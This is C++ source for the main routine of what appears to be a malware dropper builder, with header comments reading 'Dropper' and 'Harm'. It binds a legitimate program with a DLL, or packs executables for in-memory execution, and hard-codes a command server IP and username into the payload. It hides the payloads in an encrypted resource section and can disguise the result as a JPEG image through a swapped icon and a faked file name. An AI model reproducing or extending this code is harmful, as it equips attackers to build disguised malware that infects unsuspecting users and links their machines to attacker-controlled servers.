
//http://www.virustotal.com
//http://www.virscan.org
//Dropper 
//Harm

#include <windows.h>
#include <stdio.h>
#include "Section.h"
#include "Resource.h"
#include "ForgeFilename.h"
#include "SetIcon.h"
#include <stdlib.h>
#include "Public.h"
#include <string.h>
#include "crypto.h"
#include "test.h"
#include "PEParser.h"
#include "Resource.h"
#include "crypto.h"
#include "FileHelper.h"
#include "main.h"
#include "PEParser.h"

#define CONFIG_FILENAME					"config.dat"

#define TEMPLATE_TEMPORARY_FILENAME		"test.dat"

#define DEFAULT_TARGET_FILENAME			"out.exe"



#ifdef _CONSOLE

int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp) {

#ifdef _DEBUG
	test();
#endif

	int ret = 0;

	if (argc < 3)
	{
		printf("%s param error\r\n", argv[0]);
		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -c params.dat -o out.exe\r\n",argv[0]);

		printf("example:%s -b sogou.exe sbiedll.dll -f c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n", argv[0]);

		printf("example:%s -re sogou.exe -c params.dat -o out.exe\r\n", argv[0]);

		printf("example:%s -rd sogou.dll -c params.dat -o out.dll\r\n", argv[0]);	
		ret = getchar();
		return -1;
	}

	unsigned char key[16] = { 0 };
	Crypto::getkey(key);
	string curpath = Public::getCurPath();
	ret = SetCurrentDirectoryA(curpath.c_str());

	char filelist[MAX_FILE_COUNT][MAX_PATH];
	memset(filelist, 0, MAX_FILE_COUNT * MAX_PATH);
	int type = 0;
	int filecnt = 0;
	char outFn[MAX_PATH] = { 0 };
	//string dstcryptfn = "test.dat";
	//string dstcfgfn = "config.dat";

	char* username = 0;
	char* serverip = 0;

	int bRename = FALSE;

	int cpu_arch = 0; 

	string outpath = "";

	for (int seq = 1; seq < argc; seq++)
	{
		char* str = argv[seq];
		if (lstrcmpiA(str, "-b") == 0 )
		{
			type = BIND_RELEASE_PE;
			cpu_arch = GetPeArch(argv[seq +1]);

			int cpu_arch2 = GetPeArch(argv[seq + 2]);

			if (cpu_arch != cpu_arch2) {
				log("file:%s arch:%x not equal to file:%s arch:%x\r\n",argv[seq+1], cpu_arch, argv[seq + 2], cpu_arch2);
				exit(-1);
			}

			for (int j = seq + 1; j < seq +3; j++)
			{
				lstrcpyA(filelist[filecnt++], argv[j]);
			}

			seq += 2;
			continue;
		}
		else if (lstrcmpiA(str, "-re") == 0)
		{
			printf("argv[%i]:%s\r\n", seq, argv[seq + 1]);

			cpu_arch = GetPeArch(argv[seq + 1]);

			type = MEM_RUN_EXE;
			lstrcpyA(filelist[filecnt++], argv[seq + 1]);

			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-rd") == 0)
		{
			type = MEM_RUN_DLL;
			cpu_arch = GetPeArch(argv[seq + 1]);
			lstrcpyA(filelist[filecnt++], argv[seq + 1]);
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-o") == 0)
		{
			lstrcpyA(outFn, argv[seq + 1]);
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-f") == 0)
		{
			outpath = argv[seq + 1];
			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-c") == 0)
		{
			Public::prepareCfg(argv[seq + 1], CONFIG_FILENAME);
			lstrcpyA(filelist[filecnt++], CONFIG_FILENAME);

			seq += 1;
			continue;
		}
		else if (lstrcmpiA(str, "-p") == 0)
		{
			if (seq + 2 > argc) {
				log("%s %d error\r\n", __FUNCTION__, __LINE__);
				return -1;
			}

			serverip = argv[seq + 1];
			username = argv[seq + 2];

			Public::prepareParams(argv[seq + 1], argv[seq + 2],type, key,CONFIG_FILENAME);

			seq += 2;

			lstrcpyA(filelist[filecnt++], CONFIG_FILENAME);
	
			continue;
		}
		else if (lstrcmpiA(str, "-rename") == 0)
		{
			bRename = TRUE;
			continue;
		}	
	}

	if (outFn[0] == 0)
	{
		lstrcpyA(outFn, DEFAULT_TARGET_FILENAME);
	}
	if (type == 0)
	{
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		ret = getchar();
		return -1;
	}

	printf("TYPE:%d,CPU:%d\r\n",type,cpu_arch);

	if(cpu_arch!= 32 && cpu_arch !=64)
	{
		log("cannot get cpu architecture of file:%s\r\n", filelist[0]);
		ret = getchar();
		return -1;
	}

	for (int i = 0; i < filecnt; i++) {
		const char* fn = filelist[i];
		int fnlen = strlen(fn);
		if (lstrcmpA(fn + fnlen - 4, ".exe") == 0 || lstrcmpA(fn + fnlen - 4, ".dll") == 0) {
			char* iptag = "this is ip address";
			ret = FileHelper::FileSearchSet(fn, iptag, strlen(iptag)+1, serverip, strlen(serverip)+1);
			if (ret)
				log("%s %d write ip:%s in file:%s\r\n",__FUNCTION__,__LINE__, serverip,fn);
			char* usertag = "this is user name";
			ret = FileHelper::FileSearchSet(fn, usertag, strlen(usertag)+1, username, strlen(username)+1);
			if (ret)
				log("%s %d write username:%s in file:%s\r\n", __FUNCTION__, __LINE__, username, fn);
		}
	}

	char secname[] = { '.','r','c','d','a','t','a',0 };
	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, filecnt,outpath, outFn,key);
	if (resultfn == "")
	{
		log("%s %d error\r\n",__FUNCTION__,__LINE__);
		//ret = getchar();
		return -1;
	}

	if (bRename) {
		char jpgico[] = { 'j','p','g','.','i','c','o',0 };
		ChangeIcon(resultfn.c_str(), jpgico);
		char jpg[] = { 'j','p','e','g',0 };
		unsigned short ch[] = {'Ïã','¸Û','Ö®','Â·',0};
		string mystr = (char*)ch;
		FakeFilename::fakefn(resultfn, jpg, mystr);
	}

	printf("%s bind type:%d cpu arch:%d completed\r\n",PROJECT_NAME, type, cpu_arch);
	ExitProcess(0);
	return 0;
}
#else
int __stdcall wWinMain(HINSTANCE inst, HINSTANCE prev, PWSTR cmdline, int showmode) {
	HANDLE h = GetModuleHandle(0);
	return 0;
}
#endif


int GetPeArch(char * fn) {
	int fs = 0;
	char* data = 0;
	int ret = 0;
	ret = FileHelper::fileReader(fn, &data, &fs);
	if (ret <= 0)
	{
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		return -1;
	}
	int cpu_arch = PEParser::getPEArch((const char*)data);
	
	int bits = 0;
	if(cpu_arch == 0x14c)
	{
		bits = 32;
	}
	else if(cpu_arch == 0x8664)
	{
		bits = 64;
	}
	else {
		return 0;
	}

	int pebits = GetPeBits(data);

	delete data;

	if (bits == pebits) {
		return bits;
	}

	
	return 0;
}



void test() {
	Resource::getResource((DWORD)GetModuleHandle(0), "");
	return;
}